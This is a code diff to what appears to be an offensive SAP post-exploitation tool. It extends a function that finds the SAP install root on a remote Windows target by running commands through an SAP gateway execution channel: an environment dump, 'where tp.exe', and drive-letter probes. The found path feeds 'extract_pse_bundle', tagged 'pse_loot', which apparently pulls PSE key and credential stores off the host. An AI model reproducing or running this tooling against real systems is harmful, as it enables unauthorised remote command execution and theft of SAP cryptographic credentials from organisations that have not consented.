@@ -508,33 +508,86 @@ _WIN_DIR_LIBRARY_RE = _re_compile = __import__("re").compile(
 
 
 def _discover_sap_root_windows(gw_exec_fn: GwExecFn,
+                                sid: str = "",
                                 label: str = "") -> str:
     """Discover the SAP install root on a Windows target.
 
-    Reads the SAPXPG environment via ``cmd /C set``, parses out
-    DIR_LIBRARY (always set in a running SAP service account env),
-    and returns the install root (drive + ``\\usr\\sap``).  Operators
-    routinely install SAP on a dedicated drive (P:, D:, E:) instead of
-    C:, which is why hard-coding ``C:\\usr\\sap`` doesn't work in the
-    field.
+    Strategy (stops at first hit):
+      1. Read the SAPXPG environment via ``cmd /C set`` and parse
+         DIR_LIBRARY (always set in a running SAP service env).
+      2. Run ``cmd /C where tp.exe`` and infer the install root from
+         tp.exe's path (= <root>\\<SID>\\<INST>\\exe\\tp.exe).
+      3. Probe each common Windows drive for
+         ``<drive>:\\usr\\sap\\<SID>`` via ``cmd /C if exist`` — covers
+         the case where neither env discovery nor `where` works (e.g.
+         very locked-down SAPXPG sandbox).
 
-    Returns "" when DIR_LIBRARY can't be read (caller falls back to
-    the hard-coded default C:\\usr\\sap).
+    Returns the SAP install root on success (e.g. ``P:\\usr\\sap``),
+    or "" when every strategy failed (caller falls back to the
+    hard-coded ``C:\\usr\\sap``).
     """
     tag = f"[*] {label}: pse_loot" if label else "[*] pse_loot"
+
+    # Strategy 1 — DIR_LIBRARY from env block
     try:
         r = gw_exec_fn("cmd.exe", "/C set")
+        if r.get("success"):
+            out = "\n".join(r.get("output", []) or [])
+            m = _WIN_DIR_LIBRARY_RE.search(out)
+            if m:
+                usr_sap = m.group(1).rstrip("\\")
+                print(f"{tag}: DIR_LIBRARY → SAP install root {usr_sap}")
+                return usr_sap
+            else:
+                # Useful diagnostic — operator can see WHY env discovery
+                # missed.  Common cause: cmd /C set fell into the
+                # PARAMS-concat trap and emitted "syntax incorrect".
+                first_line = next((ln for ln in (r.get("output") or [])
+                                    if ln.strip()), "(empty)")
+                print(f"{tag}: cmd /C set returned no DIR_LIBRARY "
+                      f"(first line: {first_line[:80]!r})")
+    except Exception as e:
+        print(f"{tag}: cmd /C set failed: {e}")
+
+    # Strategy 2 — derive from where tp.exe
+    try:
+        r = gw_exec_fn("cmd.exe", "/C where tp.exe")
+        for line in r.get("output", []) or []:
+            line = line.strip()
+            # Expect drive:\...\<SID>\<INST>\exe\tp.exe
+            m = __import__("re").match(
+                r"^([A-Za-z]:\\.*?)(?:\\[^\\]+){4}\s*$", line)
+            if m:
+                usr_sap = m.group(1).rstrip("\\")
+                print(f"{tag}: where tp.exe → SAP install root {usr_sap}")
+                return usr_sap
     except Exception:
-        return ""
-    if not r.get("success"):
-        return ""
-    out = "\n".join(r.get("output", []) or [])
-    m = _WIN_DIR_LIBRARY_RE.search(out)
-    if not m:
-        return ""
-    usr_sap = m.group(1).rstrip("\\")
-    print(f"{tag}: DIR_LIBRARY → SAP install root {usr_sap}")
-    return usr_sap
+        pass
+
+    # Strategy 3 — drive-letter probing (operator's TWT lives on P:)
+    # Common SAP install drives in the wild: dedicated SAP volume
+    # usually mounted at P:, sometimes D:/E:/F:.  C: is checked last
+    # because hardly any modern SAP install puts the binaries there.
+    if sid:
+        for drive in ("P", "D", "E", "F", "G", "H", "S", "T", "Z", "C"):
+            candidate_sid_dir = rf"{drive}:\usr\sap\{sid.upper()}"
+            try:
+                r = gw_exec_fn(
+                    "cmd.exe",
+                    f'/C if exist "{candidate_sid_dir}" '
+                    f'(echo SAPROOT_OK) else (echo SAPROOT_MISS)')
+            except Exception:
+                continue
+            out = " ".join(r.get("output", []) or [])
+            if "SAPROOT_OK" in out:
+                usr_sap = rf"{drive}:\usr\sap"
+                print(f"{tag}: drive probe → SAP install root {usr_sap} "
+                      f"(found {candidate_sid_dir})")
+                return usr_sap
+
+    print(f"{tag}: trans-dir discovery failed on all strategies — "
+          f"falling back to default")
+    return ""
 
 
 def _read_file_b64_windows(gw_exec_fn: GwExecFn, path: str,
@@ -779,10 +832,12 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
 
     # Discover the SAP install root on Windows (operator's TWT lives on
     # P:\usr\sap, not the default C:\).  Linux always uses /usr/sap so
-    # no discovery needed there.
+    # no discovery needed there.  Pass the SID so drive-letter probing
+    # has something concrete to check existence for.
     sap_root = ""
     if os_type == "windows":
-        sap_root = _discover_sap_root_windows(gw_exec_fn, label=label)
+        sap_root = _discover_sap_root_windows(gw_exec_fn, sid=sid,
+                                                label=label)
 
     # Step 2: locate SECUDIR — try the candidates in order.
     candidates = ([secudir] if secudir
